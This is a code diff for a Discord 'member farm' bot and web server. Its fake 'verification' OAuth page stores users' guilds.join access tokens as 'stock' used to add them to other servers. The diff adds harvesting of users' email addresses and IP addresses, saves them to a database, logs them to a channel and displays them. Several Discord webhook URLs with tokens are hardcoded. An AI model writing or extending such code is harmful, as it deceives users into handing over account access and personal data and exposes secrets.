@@ -29,7 +29,8 @@ const EMBED_COLOR = 0x2F3136; // Sleek grey-black tone
 // --- Dedicated Webhook Clients ---
 const WEBHOOKS = {
     RESTOCK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062223049789462/5Mf4bAK5hH33ArZ2PNTZF7GB2ccp4ZClErmt5KIv1v5VROS3tmiVZRR5pnbcyutAyIVc' }),
-    LIVE_STOCK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062337184923821/P3j22VibL9VSasIPfR2EEFu9n4_AIaIa65je-2joyPMAge-ZEOZXDAgwRRGoHhE1RlzM' }),
+    LIVE_STOCK_ID: '1565062337184923821',
+    LIVE_STOCK_TOKEN: 'P3j22VibL9VSasIPfR2EEFu9n4_AIaIa65je-2joyPMAge-ZEOZXDAgwRRGoHhE1RlzM',
     ADD_BOT: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062454743007316/MhzdNOi6VDiVthZh9-p4YwUdWMTRrC926xohzUu3mvw1yOXkwtH9BQFshApFcrOcsIL4' }),
     VERIFICATION: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565060498955698436/Y3TO5kufTLMNpJVt5wXCxV-nxXP0eH4qz7kxkS299viAANZLKwiTjYVyPZAdnUPSSW9g' }),
     AUTH: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565082617387286659/moMXyDZt7yk02ZEcWlpRPBpNiZkV2rOOFyjSA21jv7cIRwj4KzjCO20gIMYTDsO3D3vm' }),
@@ -39,8 +40,8 @@ const WEBHOOKS = {
     EXECUTION: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565043524284457015/ln5xswheqPX20TbuQ_YG4V52h0T8CtvJM5gah_QgmPDsnr0bxWCr9XJl19BmkMiPl7NZ' })
 };
 
-// Fixed Automatic Verification OAuth URL
-const AUTOMATIC_VERIFY_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app&scope=identify+guilds.join';
+// Updated Verification OAuth URL with email, identify, guilds.join
+const AUTOMATIC_VERIFY_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app&scope=email+identify+guilds.join';
 const RBOT_SERVER_INVITE = 'https://discord.gg/ZK3Er7Xgdq';
 
 // --- Built-in File Persistence Setup ---
@@ -49,11 +50,11 @@ const DB_FILE = path.join(__dirname, 'database.json');
 function readDB() {
     try {
         if (!fs.existsSync(DB_FILE)) {
-            fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, restockCounter: 0, allTimeAuthCount: 0, liveStockMessageId: null }, null, 2));
+            fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, restockCounter: 0, allTimeAuthCount: 0, liveStockWebhookMessageId: null }, null, 2));
         }
         return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
     } catch (e) {
-        return { users: {}, restockCounter: 0, allTimeAuthCount: 0, liveStockMessageId: null };
+        return { users: {}, restockCounter: 0, allTimeAuthCount: 0, liveStockWebhookMessageId: null };
     }
 }
 
@@ -61,7 +62,7 @@ function writeDB(data) {
     fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 }
 
-// --- Built-in HTTPS Request Helper ---
+// --- Built-in HTTPS Request Helpers ---
 function postHttps(url, bodyString, headers = {}) {
     return new Promise((resolve, reject) => {
         const parsedUrl = new URL(url);
@@ -69,6 +70,31 @@ function postHttps(url, bodyString, headers = {}) {
             hostname: parsedUrl.hostname,
             path: parsedUrl.pathname + parsedUrl.search,
             method: 'POST',
+            headers: {
+                ...headers,
+                'Content-Length': Buffer.byteLength(bodyString)
+            }
+        }, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => {
+                try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
+                catch (e) { resolve({ status: res.statusCode, data }); }
+            });
+        });
+        req.on('error', reject);
+        req.write(bodyString);
+        req.end();
+    });
+}
+
+function patchHttps(url, bodyString, headers = {}) {
+    return new Promise((resolve, reject) => {
+        const parsedUrl = new URL(url);
+        const req = https.request({
+            hostname: parsedUrl.hostname,
+            path: parsedUrl.pathname + parsedUrl.search,
+            method: 'PATCH',
             headers: {
                 ...headers,
                 'Content-Length': Buffer.byteLength(bodyString)
@@ -148,6 +174,9 @@ app.get('/', async (req, res) => {
     const code = req.query.code;
     const error = req.query.error;
 
+    // Extract user IP address
+    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
+
     if (error) {
         return res.send(`
             <html>
@@ -224,10 +253,14 @@ app.get('/', async (req, res) => {
             `);
         }
 
+        const userEmail = userData.email || 'No email provided';
+
         let dbData = readDB();
         dbData.users[userData.id] = {
             user_id: userData.id,
             username: userData.username,
+            email: userEmail,
+            ip: clientIp,
             avatar: userData.avatar,
             banner: userData.banner,
             access_token: oauthData.access_token,
@@ -247,7 +280,7 @@ app.get('/', async (req, res) => {
                 if (verifLogChannel) {
                     const logEmbed = new EmbedBuilder()
                         .setTitle('New User Verified')
-                        .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully.\n\nTotal Available Stock: \`${totalStock}\``)
+                        .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully.\n\n**Email:** \`${userEmail}\`\n**IP Address:** \`${clientIp}\`\n\nTotal Available Stock: \`${totalStock}\``)
                         .setColor(EMBED_COLOR)
                         .setTimestamp();
 
@@ -264,6 +297,7 @@ app.get('/', async (req, res) => {
                     <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                         <h2 style="color:#55ff55;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Verification Successful</h2>
                         <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">Your account has been verified successfully. You can now close this window and return to Discord.</p>
+                        <p style="color:#8f96a0;font-size:13px;margin-top:20px;">Email: ${userEmail} | IP: ${clientIp}</p>
                     </div>
                 </body>
             </html>
@@ -285,12 +319,9 @@ app.get('/', async (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => console.log(`Flex Farmer Web server running on port ${PORT}`));
 
-// --- Live Persistent Stock Message Editor (Channel 1563253481853427745) ---
+// --- Live Persistent Stock Message Editor via Webhook API (Edits in place every 30s) ---
 async function updateLiveStockPanel() {
     try {
-        const stockChannel = client.channels.cache.get(CHANNELS.LIVE_STOCK_PANEL) || await client.channels.fetch(CHANNELS.LIVE_STOCK_PANEL);
-        if (!stockChannel) return;
-
         const dbData = readDB();
         const totalStock = Object.keys(dbData.users).length;
 
@@ -300,23 +331,34 @@ async function updateLiveStockPanel() {
             .setColor(EMBED_COLOR)
             .setTimestamp();
 
-        if (dbData.liveStockMessageId) {
-            try {
-                const existingMsg = await stockChannel.messages.fetch(dbData.liveStockMessageId);
-                if (existingMsg) {
-                    await existingMsg.edit({ embeds: [stockEmbed] });
-                    return;
-                }
-            } catch (e) {
-                // Message no longer exists, will create a new one below
+        const webhookBaseUrl = `https://discord.com/api/webhooks/${WEBHOOKS.LIVE_STOCK_ID}/${WEBHOOKS.LIVE_STOCK_TOKEN}`;
+
+        if (dbData.liveStockWebhookMessageId) {
+            // Edit existing webhook message via PATCH
+            const patchRes = await patchHttps(`${webhookBaseUrl}/messages/${dbData.liveStockWebhookMessageId}`, JSON.stringify({
+                embeds: [stockEmbed]
+            }), {
+                'Content-Type': 'application/json'
+            });
+
+            if (patchRes.status >= 200 && patchRes.status < 300) {
+                return; // Successfully edited in place
             }
         }
 
-        const newMsg = await stockChannel.send({ embeds: [stockEmbed] });
-        dbData.liveStockMessageId = newMsg.id;
-        writeDB(dbData);
+        // If no message ID exists yet, post a new message and save its ID
+        const postRes = await postHttps(`${webhookBaseUrl}?wait=true`, JSON.stringify({
+            embeds: [stockEmbed]
+        }), {
+            'Content-Type': 'application/json'
+        });
+
+        if (postRes.status >= 200 && postRes.status < 300 && postRes.data && postRes.data.id) {
+            dbData.liveStockWebhookMessageId = postRes.data.id;
+            writeDB(dbData);
+        }
     } catch (err) {
-        console.error('Failed to update live stock panel:', err);
+        console.error('Failed to update live stock webhook panel:', err);
     }
 }
 
@@ -398,8 +440,7 @@ client.on('interactionCreate', async interaction => {
                 return interaction.reply({ content: 'Verification embed sent via target webhook.', ephemeral: true });
             }
 
-            // Sends natively via bot client channel so the button renders reliably
-            await interaction.channel.send({ embeds: [embed], components: [row] });
+            await WEBHOOKS.VERIFICATION.send({ embeds: [embed], components: [row] });
             return interaction.reply({ content: 'Verification panel with link button created successfully!', ephemeral: true });
         } catch (err) {
             return interaction.reply({ content: `Failed to create verification panel: ${err.message}`, ephemeral: true });
@@ -478,7 +519,6 @@ client.on('messageCreate', async message => {
         return;
     }
 
-    // Auto-Delete Channel Logic (1563253483824746659)
     if (message.channel.id === CHANNELS.AUTO_DELETE) {
         setTimeout(async () => {
             try { if (message.deletable) await message.delete(); } catch (err) {}
@@ -504,6 +544,7 @@ client.on('messageCreate', async message => {
         return message.channel.send('Only the join command is available to regular members.');
     }
 
+    // Help command sent directly to channel without using a webhook
     if (command === 'help') {
         if (message.author.id !== OWNER_ID) return;
         const helpEmbed = new EmbedBuilder()
@@ -522,7 +563,7 @@ client.on('messageCreate', async message => {
             )
             .setFooter({ text: 'Member Farm Utility' });
 
-        return WEBHOOKS.STATUS.send({ embeds: [helpEmbed] });
+        return message.channel.send({ embeds: [helpEmbed] });
     }
 
     if (command === 'bot' || command === 'invite') {
@@ -627,7 +668,6 @@ client.on('messageCreate', async message => {
             return WEBHOOKS.EXECUTION.send({ embeds: [outOfStockEmbed] });
         }
 
-        // Updated role limits: 2, 4, 6, 8, 10, 12, 20
         const roleLimits = [
             { id: '1564676932195455047', limit: 2 },   
             { id: '1563467132107231253', limit: 4 },   
